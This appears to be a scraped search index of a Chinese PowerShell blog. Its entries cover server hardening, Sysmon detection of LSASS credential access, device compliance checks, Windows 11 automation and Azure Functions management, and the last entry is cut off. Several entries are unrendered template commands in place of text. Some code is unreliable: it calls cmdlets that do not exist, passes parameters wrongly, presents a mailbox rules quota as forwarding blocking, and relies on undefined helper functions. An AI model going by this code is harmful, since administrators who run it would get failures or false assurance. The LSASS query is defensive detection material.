POSH-Sysmon是一个简化配置Sysmon 的PowerShell脚本。 它让您可以轻松地使用PowerShell创建和管理 Sysinternals Sysmon v2.0 配置文件。 通过Sysmon，您可以跟踪与进程创建、网络连接、注册表更改等相关的事件。 示例: 检测凭证提取尝试 要追踪最关键的事件之一——恶意进程尝试从内存中提取凭据时， 请使用 ProcessAccess 过滤器来检测Local Security Authority Subsystem Service (LSASS) 中此类尝试： 1Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' | Where-Object {$_.EventID -eq 10 -and $_.Message -like '*LSASS*'} 强化您的电子邮件堡垒：客户端规则转发阻止控制为什么这很重要？ 攻击者经常利用Office 365，在Outlook中设置静默规则，将敏感电子邮件转发到他们的账户。 通过启用客户端规则转发阻止控制来加强您的电子邮件安全性。 PowerShell操作: 使用PowerShell启用转发阻止： 1Set-OrganizationConfig -RulesQuota 0 使用DSC进行PowerShell安全配置什么是PowerShell DSC? 期望状态配置（DSC）就像一种魔法咒语，确保您的服务器保持安全配置。 它允许您定义和强制执行Windows服务器的期望状态。 示例：根据CIS基准进行安全配置 使用PowerShell DSC根据CIS Microsoft Windows Server 2019或Azure Secure Center Baseline for Windows Server 2016等基准应用安全配置。 您的DSC代码成为了您的护身符： 123456789Configuration SecureServer { Import-DscResource -ModuleName SecurityPolicyDsc Node 'localhost' { SecurityPolicy 'Audit - Audit account logon events' { PolicySetting = 'Success,Failure' } # 更多安全设置在此处... }} HardeningKitty：Windows配置的猫护卫小猫在忙什么？ HardeningKitty，我们的猫友，会自动检查和评估Windows系统的硬化。 它还会检查像Microsoft Office和Microsoft Edge这样的单个应用程序。 PowerShell完美性： 运行HardeningKitty来评估您系统的安全姿态： 1.\\HardeningKitty.ps1 -AuditSystem 结论通过使用PowerShell，我们施展了审计、保护和加固我们的Windows服务器。记住，安全是一个持续不断的追求 —— 让你的咒语锋利，让你的PowerShell脚本更加精湛！","link":"/2024/02/28/4-Powerful-PowerShell-Security-Techniques-for-Windows-Servers/"},{"title":"PowerShell 技能连载 - 批量检测服务器端口","text":"使用 PowerShell 可以快速地检测服务器端口。以下是一个示例： 180, 443 | % { Test-Connection -ComputerName www.microsoft.com -TcpPort $_ } 在 PowerShell 提示符下运行这段代码，那么它将尝试连接到一个名为 www.microsoft.com 的计算机，并尝试连接端口 80 和 443。如果网络连接正常，那么您将会看到类似下面的输出： 12TrueTrue","link":"/2024/08/22/bach-server-port-detection/"},{"title":"PowerShell Technology Interactive Community Growth Status (March 2024)","text":"By March 2024, the number of “PowerShell Technology interaction” community has reached 1,964 people, very close to the maximum capacity of the community (2,000 people), and maintain the position of PowerShell largest Chinese community. According to Tencent’s social platform strategy, the maximum number of people in the community is 2,000, and we will keep the opportunity to provide active users as much as possible.至 2024 年 3 月，“PowerShell 技术互动”社区人数已达到 1964 人，十分接近社区最大容量（2000 人），保持 PowerShell 最大中文社区的位置。根据腾讯社交平台的策略，社区人数的上限为 2000 人，我们会尽可能保留机会给活跃用户。 If you encounter technical problems with PowerShell, or have good resources to share, please join us. QQ group number: 271143343.如您遇到 PowerShell 方面的技术问题，或有好的资源希望分享，请加入我们。QQ 群号：271143343。 Or scan the QR code with your mobile phone QQ:或者用手机 QQ 扫描二维码：","link":"/2024/03/30/powershell-technology-interactive-community-growth-status%20copy/"},{"title":"","text":"$(cat _posts/2024-04-03-powershell-loop-structures.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码使用循环结构来处理数据集合。循环是任何编程语言的基本构建块，允许对多个项目执行相同的操作，而不必为每个项目重复编写代码。PowerShell提供了多种循环类型，如foreach、while和do，每种类型都有其特定的用例。\\n/}pd}p’)","link":"/2024/04/03/powershell-loop-structures/"},{"title":"","text":"$(cat _posts/2024-04-01-powershell-error-handling.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段代码展示了PowerShell中的错误处理技术。错误处理是任何健壮脚本的关键部分，可以确保脚本在遇到异常情况时能够优雅地响应，而不是简单地失败。通过使用try/catch/finally块和错误变量，PowerShell提供了全面的错误管理能力。\\n/}pd}p’)","link":"/2024/04/01/powershell-error-handling/"},{"title":"PowerShell实现供应链安全自动化扫描","text":"123456789101112131415161718192021222324252627function Invoke-ModuleVulnerabilityScan { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$ModuleName ) # 获取模块版本信息 $module = Get-InstalledModule -Name $ModuleName -ErrorAction Stop # 调用漏洞数据库API $response = Invoke-RestMethod -Uri &quot;https://vulndb.example.com/api/modules/$($module.Name)/$($module.Version)&quot; # 生成安全报告 [PSCustomObject]@{ ModuleName = $module.Name Version = $module.Version Vulnerabilities = $response.vulns.Count Critical = $response.vulns | Where-Object { $_.severity -eq 'Critical' } | Measure-Object | Select-Object -Expand Count LastUpdated = $module.PublishedDate } | Export-Csv -Path &quot;$env:TEMP\\ModuleSecurityScan_$(Get-Date -Format yyyyMMdd).csv&quot; -Append}# 扫描常用模块'PSReadLine', 'Pester', 'Az' | ForEach-Object { Invoke-ModuleVulnerabilityScan -ModuleName $_ -Verbose} 核心功能： 自动化检测已安装PowerShell模块版本 对接漏洞数据库API进行安全检查 生成包含严重性等级的安全报告 扩展方向： 集成软件物料清单(SBOM)生成 添加自动补丁更新功能 与CI/CD流水线集成实现预发布扫描","link":"/2024/04/04/supply-chain-security/"},{"title":"","text":"$(cat _posts/2024-04-02-powershell-variable-scopes.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/04/02/powershell-variable-scopes/"},{"title":"PowerShell 技能连载 - 使用 PowerShell 自动化 Windows 11 任务：实用指南","text":"您想通过自动化Windows 11系统上的各种任务来节省时间和精力吗？如果是这样，您应该学习如何使用PowerShell，这是一种强大的脚本语言和命令行工具，可以帮助您更快速、更轻松地完成任务。在本博客中，我们将向您展示如何使用PowerShell来自动化Windows 11上常见或复杂任务的一些实际示例，例如： 使用PowerShell管理网络设置和连接 使用PowerShell监视系统性能和资源 使用PowerShell备份和恢复文件夹与文件 使用PowerShell安装和更新Windows功能 使用PowerShell创建并运行定时任务 使用 PowerShell 管理网络设置与连接PowerShell 可以帮助您轻松高效地管理 Windows 11 系统上的网络设置与连接。您可以使用 PowerShell 执行各种操作，比如配置 IP 地址、DNS 服务器、防火墙、代理以及 VPN。 您还可以使用 PowerShell 测试网络连通性、ping 命令、traceroute 和解析主机名。 1234567891011# 定义接口别名, IP 地址, 子网掩码, 网关 和 DNS 服务器$interface = &quot;Ethernet&quot;$ip = &quot;192.168.1.100&quot;$subnet = &quot;255.255.255.0&quot;$gateway = &quot;192.168.1.1&quot;$dns = &quot;8.8.8.8&quot;# 设置接口的IP地址, DNS服务器 和 防火墙配置文件Set-NetIPAddress -InterfaceAlias $interface -IPAddress $ip -PrefixLength $subnet -DefaultGateway $gatewaySet-DnsClientServerAddress -InterfaceAlias $interface -ServerAddresses $dnsSet-NetFirewallProfile -Profile Private -Enabled True 使用 PowerShell 监控系统性能和资源PowerShell 可以帮助您轻松高效地监控 Windows 11 系统的系统性能和资源。您可以使用 PowerShell 执行各种操作，如获取 CPU、内存、磁盘和网络使用情况，测量命令或脚本的执行时间和内存消耗，并生成性能报告和图表。 123456789101112131415161718192021222324252627282930313233343536373839404142434445# PowerShell script for monitoring system performance# Define the performance counters for CPU and memory usage$cpu = &quot;\\Processor(_Total)\\% Processor Time&quot;$memory = &quot;\\Memory\\Available MBytes&quot;# Get the performance counter data for CPU and memory usage$data = Get-Counter -Counter $cpu,$memory -SampleInterval 1 -MaxSamples 10# Create a chart object from the performance counter data$chart = New-Object System.Windows.Forms.DataVisualization.Charting.Chart$chart.Width = 800$chart.Height = 600$chart.BackColor = &quot;White&quot;# Add a chart area, a series for CPU usage, a series for memory usage, and a legend to the chart object$area = New-Object System.Windows.Forms.DataVisualization.Charting.ChartArea$area.AxisX.Title = &quot;Time (seconds)&quot;$area.AxisY.Title = &quot;Usage (%)&quot;$area.AxisY2.Title = &quot;Available (MB)&quot;$chart.ChartAreas.Add($area)$series1 = New-Object System.Windows.Forms.DataVisualization.Charting.Series$series1.Name = &quot;CPU&quot;$series1.ChartType = &quot;Line&quot;$series1.Color = &quot;Red&quot;$series1.BorderWidth = 3$series1.Points.DataBindXY($data.Timestamps,$data.CounterSamples[0].CookedValue)$chart.Series.Add($series1)$series2 = New-Object System.Windows.Forms.DataVisualization.Charting.Series$series2.Name = &quot;Memory&quot;$series2.ChartType = &quot;Line&quot;$series2.Color = &quot;Blue&quot;$series2.BorderWidth = 3$series2.YAxisType = &quot;Secondary&quot;$series2.Points.DataBindXY($data.Timestamps,$data.CounterSamples[1].CookedValue)$chart.Series.Add($series2)$legend = New-Object System.Windows.Forms.DataVisualization.Charting.Legend$legend.Docking = &quot;Top&quot;$chart.Legends.Add($legend)# Save the chart object as an image file$chart.SaveImage(&quot;C:\\Performance.png&quot;,&quot;png&quot;) 使用 PowerShell 备份和恢复文件夹PowerShell 可以帮助您轻松高效地备份和恢复 Windows 11 系统中的文件夹。您可以使用 PowerShell 执行各种操作，如创建、复制、移动、重命名、删除、搜索和压缩文件夹。您还可以使用 PowerShell 创建和使用备份策略、备份集和备份项。 12345678910111213# PowerShell script for backing up and restoring files and folders# Define the folder to backup and the backup location$folder = &quot;C:\\Users\\YourName\\Documents&quot;$location = &quot;D:\\Backup&quot;# Create a backup policy that runs daily and keeps backups for 30 days$policy = New-BackupPolicy -Frequency Daily -RetentionPeriod 30# Set the backup policy for the computerSet-BackupPolicy -Policy $policy# Backup the folder to the backup locationBackup-File -Source $folder -Destination $location Here is a summary of a PowerShell script that restores a file or folder from a backup to a specified location: 12345678910111213# Define the file or folder to restore and the restore location$file = &quot;C:\\Users\\YourName\\Documents\\Report.docx&quot;$location = &quot;C:\\Users\\YourName\\Desktop&quot;# Get the latest backup set that contains the file or folder$set = Get-BackupSet | Sort-Object -Property CreationTime -Descending | Select-Object -First 1# Get the backup item that matches the file or folder$item = Get-BackupItem -BackupSet $set -Path $file# Restore the file or folder to the restore locationRestore-File -BackupItem $item -Destination $location 使用 PowerShell 安装和更新 Windows 功能PowerShell 可以帮助您轻松高效地在 Windows 11 系统上安装和更新 Windows 功能。您可以使用 PowerShell 执行各种操作，如列出、启用、禁用或更新诸如 Hyper-V、Windows 子系统 for Linux 或 Windows 沙盒等 Windows 功能。 123# 用于安装和更新 Windows 功能的 PowerShell 脚本# 在计算机上安装 Hyper-V 功能Install-WindowsFeature -Name Hyper-V -IncludeManagementTools -Restart 以下是一个概要说明了一个 PowerShell 脚本，该脚本从计算机中卸载了 Windows 子系统 for Linux 功能并移除相关文件： 12# 从计算机中卸载 Windows 子系统 for Linux 功能Uninstall-WindowsFeature -Name Microsoft-Windows-Subsystem-Linux -Remove 使用 PowerShell 创建和运行定时任务PowerShell 可以帮助您轻松高效地在 Windows 11 系统上创建和运行定时任务。您可以使用 PowerShell 执行各种操作，如创建、注册、启动、停止或禁用定时任务，例如运行一个 PowerShell 脚本、发送电子邮件或显示消息。 123456789101112131415# 用于创建和运行定时任务的 PowerShell 脚本# 定义要运行的 PowerShell 脚本$script = &quot;C:\\Scripts\\Backup.ps1&quot;# 创建一个新的定时任务动作来运行这个 PowerShell 脚本$action = New-ScheduledTaskAction -Execute &quot;powershell.exe&quot; -Argument &quot;-File $script&quot;# 创建一个新的触发器，在每天早上10点执行该任务$trigger = New-ScheduledTaskTrigger -Daily -At 10am# 创建一组新的设置，如果任务执行时间过长则停止该任务$setting = New-ScheduledTaskSettingSet -ExecutionTimeLimit (New-TimeSpan -Minutes 30)# 在计算机上注册这个新的定时任务，并指定名称、动作、触发器及设置Register-ScheduledTask –Name &quot;Backup&quot; –Action $action –Trigger $trigger –Setting $setting 结论PowerShell 是一款多才多艺且强大的工具，可帮助您自动化处理在Windows 11系统上进行各种操作。您可以在官方PowerShell文档中找到更多关于PowerShell 的信息和示例。感谢阅读此篇博客文章。希望对你有所帮助并且有趣。 😊","link":"/2024/04/08/Automate-Windows-11-Tasks-with-PowerShell-A-Practical-Guide/"},{"title":"","text":"$(cat _posts/2024-04-09-25-Best-Powershell-Script-Repository.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/04/09/25-Best-Powershell-Script-Repository/"},{"title":"PowerShell 技能连载 - 零信任设备合规检查","text":"在零信任安全架构中，设备合规性验证是重要环节。以下脚本实现自动化设备安全检查： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950function Get-DeviceCompliance { [CmdletBinding()] param( [ValidateSet('Basic','Advanced')] [string]$CheckLevel = 'Basic' ) $report = [PSCustomObject]@{ TPMEnabled = $false BitLockerStatus = 'NotEncrypted' FirewallActive = $false LastUpdateDays = 999 Compliant = $false } try { # TPM状态检查 $tpm = Get-CimInstance -ClassName Win32_Tpm -Namespace root/cimv2/Security/MicrosoftTpm $report.TPMEnabled = $tpm.IsEnabled_InitialValue # BitLocker检查 $blv = Get-BitLockerVolume -MountPoint $env:SystemDrive 2&gt;$null $report.BitLockerStatus = if($blv.ProtectionStatus -eq 'On') {'Encrypted'} else {'NotEncrypted'} # 防火墙状态 $fw = Get-NetFirewallProfile | Where-Object {$_.Enabled -eq 'True'} $report.FirewallActive = [bool]($fw | Measure-Object).Count # 系统更新检查 $lastUpdate = (Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 1).InstalledOn $report.LastUpdateDays = (New-TimeSpan -Start $lastUpdate -End (Get-Date)).Days # 高级检查 if($CheckLevel -eq 'Advanced') { $report | Add-Member -NotePropertyName SecureBoot -NotePropertyValue (Confirm-SecureBootUEFI) $report | Add-Member -NotePropertyName HyperVEnabled -NotePropertyValue (Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V).State } # 合规判定 $report.Compliant = $report.TPMEnabled -and ($report.BitLockerStatus -eq 'Encrypted') -and $report.FirewallActive -and ($report.LastUpdateDays -lt 30) } catch { Write-Warning &quot;设备检查异常: $_&quot; } return $report} 实现原理： 通过WMI/CIM接口获取TPM芯片状态，验证硬件安全基础 检查BitLocker加密状态，确保数据存储安全 扫描防火墙配置，确认至少有一个激活的防护配置文件 计算系统最后更新天数，确保漏洞及时修补 高级模式增加UEFI安全启动和虚拟化安全检查 使用示例： 12345# 基本检查Get-DeviceCompliance# 高级检查Get-DeviceCompliance -CheckLevel Advanced 最佳实践： 与Intune等MDM解决方案集成 定期通过任务计划执行检查 对不合规设备启动修复流程 记录检查结果到中央日志服务器 注意事项：• 需要本地管理员权限执行• 部分检查仅支持Windows 10/11企业版• 建议配合组策略共同使用","link":"/2024/04/10/powershell-zero-trust-check/"},{"title":"","text":"$(cat _posts/2024-04-05-powershell-string-manipulation.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/04/05/powershell-string-manipulation/"},{"title":"","text":"$(cat _posts/2024-04-12-powershell-log-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/04/12/powershell-log-management/"},{"title":"PowerShell 技能连载 - 针对Windows服务器的4种强大的PowerShell安全技术","text":"简介在不断发展的网络安全领域中，加固您的Windows服务器不仅是最佳实践，而且是必要的。PowerShell凭借其多功能性和自动化能力，在确保服务器安全的神奇旅程中成为我们可靠的魔杖。让我们讨论一下4种PowerShell安全技术，这将有助于实现我们的目标。 PowerShell安全性: 使用PowerShell进行审计使用POSH-Sysmon配置SysmonSysmon: 沉默的哨兵 由微软开发的Sysmon是一个强大的工具，用于监视系统并添加细粒度事件以便即使在重启后也能被跟踪。 这就像拥有一把神奇的放大镜，可以揭示服务器上隐藏的活动。 为什么使用POSH-Sysmon? POSH-Sysmon是一个简化配置Sysmon 的PowerShell脚本。 它让您可以轻松地使用PowerShell创建和管理 Sysinternals Sysmon v2.0 配置文件。 通过Sysmon，您可以跟踪与进程创建、网络连接、注册表更改等相关的事件。 示例: 检测凭证提取尝试 要追踪最关键的事件之一——恶意进程尝试从内存中提取凭据时， 请使用 ProcessAccess 过滤器来检测Local Security Authority Subsystem Service (LSASS) 中此类尝试： 1Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' | Where-Object {$_.EventID -eq 10 -and $_.Message -like '*LSASS*'} 强化您的电子邮件堡垒：客户端规则转发阻止控制为什么这很重要？ 攻击者经常利用Office 365，在Outlook中设置静默规则，将敏感电子邮件转发到他们的账户。 通过启用客户端规则转发阻止控制来加强您的电子邮件安全性。 PowerShell操作: 使用PowerShell启用转发阻止： 1Set-OrganizationConfig -RulesQuota 0 使用DSC进行PowerShell安全配置什么是PowerShell DSC? 期望状态配置（DSC）就像一种魔法咒语，确保您的服务器保持安全配置。 它允许您定义和强制执行Windows服务器的期望状态。 示例：根据CIS基准进行安全配置 使用PowerShell DSC根据CIS Microsoft Windows Server 2019或Azure Secure Center Baseline for Windows Server 2016等基准应用安全配置。 您的DSC代码成为了您的护身符： 123456789Configuration SecureServer { Import-DscResource -ModuleName SecurityPolicyDsc Node 'localhost' { SecurityPolicy 'Audit - Audit account logon events' { PolicySetting = 'Success,Failure' } # 更多安全设置在此处... }} HardeningKitty：Windows配置的猫护卫小猫在忙什么？ HardeningKitty，我们的猫友，会自动检查和评估Windows系统的硬化。 它还会检查像Microsoft Office和Microsoft Edge这样的单个应用程序。 PowerShell完美性： 运行HardeningKitty来评估您系统的安全姿态： 1.\\HardeningKitty.ps1 -AuditSystem 结论通过使用PowerShell，我们施展了审计、保护和加固我们的Windows服务器。记住，安全是一个持续不断的追求 —— 让你的咒语锋利，让你的PowerShell脚本更加精湛！","link":"/2024/04/15/4-Powerful-PowerShell-Security-Techniques-for-Windows-Servers/"},{"title":"","text":"$(cat _posts/2024-04-16-powershell-performance-optimization.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/04/16/powershell-performance-optimization/"},{"title":"PowerShell 技能连载 - Azure Functions 集成","text":"在无服务器计算时代，将PowerShell与Azure Functions集成可以为云服务带来强大的自动化能力。本文将介绍如何使用PowerShell构建一个Azure Functions管理系统，包括函数管理、触发器配置和监控分析等功能。 函数管理首先，让我们创建一个用于管理Azure Functions的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293function Manage-AzureFunctions { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$FunctionID, [Parameter()] [string[]]$FunctionTypes, [Parameter()] [ValidateSet(&quot;Create&quot;, &quot;Update&quot;, &quot;Delete&quot;)] [string]$OperationMode = &quot;Create&quot;, [Parameter()] [hashtable]$FunctionConfig, [Parameter()] [string]$LogPath ) try { $manager = [PSCustomObject]@{ FunctionID = $FunctionID StartTime = Get-Date FunctionStatus = @{} Operations = @{} Issues = @() } # 获取函数配置 $config = Get-FunctionConfig -FunctionID $FunctionID # 管理函数 foreach ($type in $FunctionTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Operations = @{} Issues = @() } # 应用函数配置 $typeConfig = Apply-FunctionConfig ` -Config $config ` -Type $type ` -Mode $OperationMode ` -Settings $FunctionConfig $status.Config = $typeConfig # 执行函数操作 $operations = Execute-FunctionOperations ` -Type $type ` -Config $typeConfig $status.Operations = $operations $manager.Operations[$type] = $operations # 检查函数问题 $issues = Check-FunctionIssues ` -Operations $operations ` -Config $typeConfig $status.Issues = $issues $manager.Issues += $issues # 更新函数状态 if ($issues.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Success&quot; } $manager.FunctionStatus[$type] = $status } # 记录函数日志 if ($LogPath) { $manager | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;函数管理失败：$_&quot; return $null }} 触发器配置接下来，创建一个用于管理触发器配置的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Configure-FunctionTriggers { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$TriggerID, [Parameter()] [string[]]$TriggerTypes, [Parameter()] [ValidateSet(&quot;HTTP&quot;, &quot;Timer&quot;, &quot;Queue&quot;, &quot;Blob&quot;)] [string]$TriggerMode = &quot;HTTP&quot;, [Parameter()] [hashtable]$TriggerConfig, [Parameter()] [string]$ReportPath ) try { $configurator = [PSCustomObject]@{ TriggerID = $TriggerID StartTime = Get-Date TriggerStatus = @{} Configurations = @{} Issues = @() } # 获取触发器配置 $config = Get-TriggerConfig -TriggerID $TriggerID # 管理触发器 foreach ($type in $TriggerTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Configurations = @{} Issues = @() } # 应用触发器配置 $typeConfig = Apply-TriggerConfig ` -Config $config ` -Type $type ` -Mode $TriggerMode ` -Settings $TriggerConfig $status.Config = $typeConfig # 配置触发器 $configurations = Configure-TriggerResources ` -Type $type ` -Config $typeConfig $status.Configurations = $configurations $configurator.Configurations[$type] = $configurations # 检查触发器问题 $issues = Check-TriggerIssues ` -Configurations $configurations ` -Config $typeConfig $status.Issues = $issues $configurator.Issues += $issues # 更新触发器状态 if ($issues.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Success&quot; } $configurator.TriggerStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-TriggerReport ` -Configurator $configurator ` -Config $config $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新配置器状态 $configurator.EndTime = Get-Date return $configurator } catch { Write-Error &quot;触发器配置失败：$_&quot; return $null }} 上面的代码定义了一个名为 Manage-AzureFunctions 的PowerShell函数，用于执行特定的自动化任务。该函数封装了一系列操作，使得脚本更加模块化和可重用。 监控分析最后，创建一个用于管理监控分析的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Monitor-FunctionPerformance { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$MonitorID, [Parameter()] [string[]]$MonitorTypes, [Parameter()] [ValidateSet(&quot;Metrics&quot;, &quot;Logs&quot;, &quot;Events&quot;)] [string]$MonitorMode = &quot;Metrics&quot;, [Parameter()] [hashtable]$MonitorConfig, [Parameter()] [string]$ReportPath ) try { $monitor = [PSCustomObject]@{ MonitorID = $MonitorID StartTime = Get-Date MonitorStatus = @{} Metrics = @{} Alerts = @() } # 获取监控配置 $config = Get-MonitorConfig -MonitorID $MonitorID # 管理监控 foreach ($type in $MonitorTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Metrics = @{} Alerts = @() } # 应用监控配置 $typeConfig = Apply-MonitorConfig ` -Config $config ` -Type $type ` -Mode $MonitorMode ` -Settings $MonitorConfig $status.Config = $typeConfig # 收集监控指标 $metrics = Collect-FunctionMetrics ` -Type $type ` -Config $typeConfig $status.Metrics = $metrics $monitor.Metrics[$type] = $metrics # 检查监控告警 $alerts = Check-MonitorAlerts ` -Metrics $metrics ` -Config $typeConfig $status.Alerts = $alerts $monitor.Alerts += $alerts # 更新监控状态 if ($alerts.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Normal&quot; } $monitor.MonitorStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-MonitorReport ` -Monitor $monitor ` -Config $config $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新监控器状态 $monitor.EndTime = Get-Date return $monitor } catch { Write-Error &quot;监控分析失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理Azure Functions的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103# 管理Azure Functions$manager = Manage-AzureFunctions -FunctionID &quot;FUNCTION001&quot; ` -FunctionTypes @(&quot;HTTP&quot;, &quot;Timer&quot;, &quot;Queue&quot;) ` -OperationMode &quot;Create&quot; ` -FunctionConfig @{ &quot;HTTP&quot; = @{ &quot;Name&quot; = &quot;http-function&quot; &quot;Runtime&quot; = &quot;PowerShell&quot; &quot;Version&quot; = &quot;7.2&quot; &quot;Memory&quot; = 256 &quot;Timeout&quot; = 30 &quot;Bindings&quot; = @{ &quot;Type&quot; = &quot;httpTrigger&quot; &quot;Direction&quot; = &quot;in&quot; &quot;Name&quot; = &quot;req&quot; &quot;Methods&quot; = @(&quot;GET&quot;, &quot;POST&quot;) &quot;AuthLevel&quot; = &quot;function&quot; } } &quot;Timer&quot; = @{ &quot;Name&quot; = &quot;timer-function&quot; &quot;Runtime&quot; = &quot;PowerShell&quot; &quot;Version&quot; = &quot;7.2&quot; &quot;Memory&quot; = 256 &quot;Timeout&quot; = 30 &quot;Bindings&quot; = @{ &quot;Type&quot; = &quot;timerTrigger&quot; &quot;Direction&quot; = &quot;in&quot; &quot;Name&quot; = &quot;timer&quot; &quot;Schedule&quot; = &quot;0 */5 * * * *&quot; } } &quot;Queue&quot; = @{ &quot;Name&quot; = &quot;queue-function&quot; &quot;Runtime&quot; = &quot;PowerShell&quot; &quot;Version&quot; = &quot;7.2&quot; &quot;Memory&quot; = 256 &quot;Timeout&quot; = 30 &quot;Bindings&quot; = @{ &quot;Type&quot; = &quot;queueTrigger&quot; &quot;Direction&quot; = &quot;in&quot; &quot;Name&quot; = &quot;queue&quot; &quot;QueueName&quot; = &quot;myqueue&quot; &quot;Connection&quot; = &quot;AzureWebJobsStorage&quot; } } } ` -LogPath &quot;C:\\Logs\\function_management.json&quot;# 配置函数触发器$configurator = Configure-FunctionTriggers -TriggerID &quot;TRIGGER001&quot; ` -TriggerTypes @(&quot;HTTP&quot;, &quot;Timer&quot;, &quot;Queue&quot;) ` -TriggerMode &quot;HTTP&quot; ` -TriggerConfig @{ &quot;HTTP&quot; = @{ &quot;Route&quot; = &quot;api/process&quot; &quot;Methods&quot; = @(&quot;GET&quot;, &quot;POST&quot;) &quot;AuthLevel&quot; = &quot;function&quot; &quot;Cors&quot; = @{ &quot;Origins&quot; = @(&quot;https://example.com&quot;) &quot;Methods&quot; = @(&quot;GET&quot;, &quot;POST&quot;) &quot;Headers&quot; = @(&quot;Content-Type&quot;, &quot;Authorization&quot;) } } &quot;Timer&quot; = @{ &quot;Schedule&quot; = &quot;0 */5 * * * *&quot; &quot;UseMonitor&quot; = $true &quot;RunOnStartup&quot; = $true } &quot;Queue&quot; = @{ &quot;QueueName&quot; = &quot;myqueue&quot; &quot;Connection&quot; = &quot;AzureWebJobsStorage&quot; &quot;BatchSize&quot; = 16 &quot;MaxDequeueCount&quot; = 5 } } ` -ReportPath &quot;C:\\Reports\\trigger_configuration.json&quot;# 监控函数性能$monitor = Monitor-FunctionPerformance -MonitorID &quot;MONITOR001&quot; ` -MonitorTypes @(&quot;Execution&quot;, &quot;Memory&quot;, &quot;Network&quot;) ` -MonitorMode &quot;Metrics&quot; ` -MonitorConfig @{ &quot;Execution&quot; = @{ &quot;Metrics&quot; = @(&quot;Duration&quot;, &quot;Executions&quot;, &quot;SuccessRate&quot;) &quot;Threshold&quot; = 80 &quot;Interval&quot; = 60 &quot;Alert&quot; = $true } &quot;Memory&quot; = @{ &quot;Metrics&quot; = @(&quot;MemoryUsage&quot;, &quot;MemoryLimit&quot;) &quot;Threshold&quot; = 90 &quot;Interval&quot; = 60 &quot;Alert&quot; = $true } &quot;Network&quot; = @{ &quot;Metrics&quot; = @(&quot;Requests&quot;, &quot;Latency&quot;, &quot;Errors&quot;) &quot;Threshold&quot; = 85 &quot;Interval&quot; = 60 &quot;Alert&quot; = $true } } ` -ReportPath &quot;C:\\Reports\\function_monitoring.json&quot; 最佳实践 实施函数管理 配置触发器服务 监控性能指标 保持详细的部署记录 定期进行健康检查 实施监控策略 建立告警机制 保持系统文档更新","link":"/2024/04/11/powershell-azure-functions-integration/"},{"title":"","text":"$(cat _posts/2024-04-17-powershell-xml-handling.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码演示了PowerShell中的数据处理能力。PowerShell擅长处理各种数据格式，如CSV、XML、JSON等，并提供了丰富的命令和技术来转换、过滤和操作数据。这些功能使PowerShell成为数据提取、转换和加载(ETL)流程的理想选择。\\n/}pd}p’)","link":"/2024/04/17/powershell-xml-handling/"},{"title":"PowerShell 技能连载 - 元宇宙虚拟资产自动化管理系统","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556function Manage-MetaverseAssets { [CmdletBinding()] param( 